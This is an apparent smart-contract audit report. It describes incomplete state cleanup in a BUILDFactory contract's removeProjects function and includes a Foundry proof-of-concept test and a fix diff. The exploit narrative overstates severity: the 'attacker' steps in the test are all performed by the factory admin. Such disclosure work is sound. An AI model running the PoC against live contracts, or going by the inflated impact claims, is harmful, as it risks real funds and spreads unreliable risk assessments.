# Critical Vulnerability: Incomplete State Cleanup on Project Removal Leads to Permanent Fund Lock

## Summary

The `BUILDFactory.removeProjects()` function does not completely clear all data associated with a project upon its removal. While it deletes the core `ProjectConfig` (containing the admin and claim contract addresses), it fails to clear the project's financial ledger stored in `s_tokenAmounts` and other state mappings.

This oversight allows an attacker to re-register a previously removed project's token address and inherit its entire deposit history. Although the attacker cannot directly steal the funds, this action leads to a permanent lock of the original project's deposited assets and a corruption of the factory's internal accounting, representing a critical failure of the contract's state management.

## Vulnerability Details

**Location:** `BUILDFactory.sol#L121-L135`

The `removeProjects` function executes `delete s_projects[token]`. According to Solidity's behavior, this operation only clears the storage slots for the `ProjectConfig` struct. It has no effect on other state variables that use the `token` address as a primary key.

Specifically, the following critical mappings are left untouched:
- `mapping(address token => TokenAmounts config) private s_tokenAmounts;`
- `mapping(address token => mapping(uint256 seasonId => ...)) private s_projectSeasonConfigs;`
- `mapping(address token => mapping(uint256 seasonId => ...)) private s_refundableAmounts;`
- `mapping(address token => Withdrawal) private s_withdrawals;`

Consequently, if a project with a given token address deposits funds, is removed, and then a new project is created with the same token address, the new project entity inherits the `s_tokenAmounts` record of the original project.

## Impact

This vulnerability creates two severe consequences:

1.  **Permanent Fund Lock:** The core impact is that funds deposited by an original project become permanently irrecoverable. The exploit narrative is as follows:
    - A legitimate project deposits funds into its `BUILDClaim` contract. These funds are physically held by that contract.
    - The factory admin removes the project. The funds remain in the original (now orphaned) `BUILDClaim` contract.
    - An attacker registers a new project with the same token address. The factory's stale accounting (`s_tokenAmounts`) grants this new project credit for the old deposits.
    - The attacker schedules a withdrawal based on this stale data. The factory authorizes it.
    - The attacker deploys a *new* `BUILDClaim` contract and attempts to execute the withdrawal. This call will always fail with an `ERC20InsufficientBalance` error because the new contract is empty; the funds are trapped in the old one.
    - Since there is no mechanism to access funds in a deregistered claim contract, the original deposited assets are locked forever.

2.  **State and Accounting Corruption:** The factory’s internal ledger becomes desynchronized from on-chain reality. It may authorize withdrawals that can never be executed, and its `totalDeposited` record for a token address will be permanently inflated by the stale data, breaking the integrity of its accounting functions like `calcMaxAvailableAmount`.

## Proof of Concept

The following Foundry test (`test/PoC.t.sol`) provides a clear, step-by-step demonstration of how the stale state leads to a permanent fund lock. The test passes because the exploit executes successfully, confirming the vulnerability by hitting the expected final revert.

```solidity
// File: test/PoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

import {BUILDFactory} from "src/BUILDFactory.sol";
import {BUILDClaim} from "src/BUILDClaim.sol";
import {IBUILDFactory} from "src/interfaces/IBUILDFactory.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IDelegateRegistry} from "@delegatexyz/delegate-registry/v2.0/src/IDelegateRegistry.sol";
import {IERC20Errors} from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";

contract MintableERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract StubRegistry {
    function checkDelegateForContract(address,address,address,bytes32) external pure returns (bool) { return false; }
}

contract ProofOfConcept is Test {
    BUILDFactory public factory;
    MintableERC20 public token;
    StubRegistry public stubRegistry;
    address public factoryAdmin = makeAddr("factoryAdmin");
    address public originalProjectAdmin = makeAddr("originalProjectAdmin");
    address public attackerProjectAdmin = makeAddr("attackerProjectAdmin");

    function test_PoC_StaleStateCausesFundLock() public {
        // --- 1. SETUP ---
        stubRegistry = new StubRegistry();
        token = new MintableERC20();
        vm.prank(factoryAdmin);
        factory = new BUILDFactory(
            BUILDFactory.ConstructorParams({
                admin: factoryAdmin,
                maxUnlockDuration: 30 days,
                maxUnlockDelay: 7 days,
                delegateRegistry: IDelegateRegistry(address(stubRegistry))
            })
        );
        
        // --- 2. A LEGITIMATE PROJECT IS CREATED AND FUNDED ---
        console.log("--- Phase 1: A legitimate project deposits funds ---");
        vm.prank(factoryAdmin);
        IBUILDFactory.AddProjectParams[] memory addParams = new IBUILDFactory.AddProjectParams[](1);
        addParams[0] = IBUILDFactory.AddProjectParams({ token: address(token), admin: originalProjectAdmin });
        factory.addProjects(addParams);

        vm.prank(originalProjectAdmin);
        BUILDClaim originalClaimContract = BUILDClaim(address(factory.deployClaim(address(token))));
        
        uint256 depositAmount = 1_000_000 ether;
        token.mint(originalProjectAdmin, depositAmount);
        
        vm.startPrank(originalProjectAdmin);
        token.approve(address(originalClaimContract), depositAmount);
        originalClaimContract.deposit(depositAmount);
        vm.stopPrank();

        assertEq(token.balanceOf(address(originalClaimContract)), depositAmount);
        console.log("Original claim contract now holds:", token.balanceOf(address(originalClaimContract)));

        // --- 3. THE PROJECT IS REMOVED BY THE FACTORY ADMIN ---
        console.log("\n--- Phase 2: The factory admin removes the project ---");
        vm.prank(factoryAdmin);
        address[] memory tokensToRemove = new address[](1);
        tokensToRemove[0] = address(token);
        factory.removeProjects(tokensToRemove);
        console.log("Project associated with the token has been removed.");
        
        // --- 4. VERIFICATION OF THE VULNERABILITY ---
        console.log("\n--- Phase 3: Verifying the broken state ---");

        vm.prank(factoryAdmin);
        IBUILDFactory.AddProjectParams[] memory attackParams = new IBUILDFactory.AddProjectParams[](1);
        attackParams[0] = IBUILDFactory.AddProjectParams({ token: address(token), admin: attackerProjectAdmin });
        factory.addProjects(attackParams);
        
        IBUILDFactory.TokenAmounts memory amountsAfter = factory.getTokenAmounts(address(token));
        assertEq(amountsAfter.totalDeposited, depositAmount, "Vulnerability confirmed: Stale deposit data was retained!");
        console.log("Factory accounting still shows", amountsAfter.totalDeposited, "deposited.");
        assertEq(token.balanceOf(address(originalClaimContract)), depositAmount, "Funds are still in the old contract.");
        console.log("Actual funds are still locked in the original claim contract:", address(originalClaimContract));

        // --- 5. EXPLOITATION OUTCOME: PERMANENTLY LOCKED FUNDS ---
        console.log("\n--- Exploitation Outcome: Permanent Fund Lock ---");

        vm.prank(factoryAdmin);
        factory.scheduleWithdraw(address(token), attackerProjectAdmin, depositAmount);
        console.log("Attacker's admin successfully scheduled a withdrawal.");

        vm.prank(attackerProjectAdmin);
        BUILDClaim newClaimContract = BUILDClaim(address(factory.deployClaim(address(token))));
        
        vm.prank(attackerProjectAdmin);
        vm.expectRevert(
            abi.encodeWithSelector(
                IERC20Errors.ERC20InsufficientBalance.selector,
                address(newClaimContract),
                0,
                depositAmount
            )
        );
        newClaimContract.withdraw();

        console.log("SUCCESS: PoC confirmed. The withdrawal fails, proving the funds in the original contract are permanently locked.");
    }
}
```

## Recommended Remediation

To fully address this vulnerability, the `removeProjects` function must be modified to comprehensively clear all storage associated with the `token` being removed.

```diff
  function removeProjects(
    address[] calldata tokens
  ) external override whenOpen onlyRole(DEFAULT_ADMIN_ROLE) {
    EnumerableSet.AddressSet storage projectsList = s_projectsList;
    // Cache array length outside loop
    uint256 tokensLength = tokens.length;
    for (uint256 i = 0; i < tokensLength; ++i) {
      address token = tokens[i];
      if (!projectsList.remove(token)) {
        revert ProjectDoesNotExist(token);
      }
      delete s_projects[token];
+     delete s_tokenAmounts[token];
+     delete s_withdrawals[token];
+     // Note: Season-related mappings are not cleared here. See further recommendations.

      emit ProjectRemoved(token);
    }
  }
```
**Further Considerations:**
Clearing nested mappings like `s_projectSeasonConfigs` is not straightforward with `delete`. This suggests a potential design limitation where fully removing a project with a history is problematic. Two safer long-term strategies could be:
1.  **Disallow Re-adding:** Maintain a separate mapping to track removed tokens and prevent them from ever being re-added.
2.  **Soft Deletion:** Instead of deleting, add a `status` field to the `ProjectConfig` struct to mark a project as `Deactivated`, preventing any new interactions while preserving its history for archival purposes.

However, as an immediate fix, clearing `s_tokenAmounts` and `s_withdrawals` is essential to prevent the demonstrated fund lock and accounting corruption exploit.
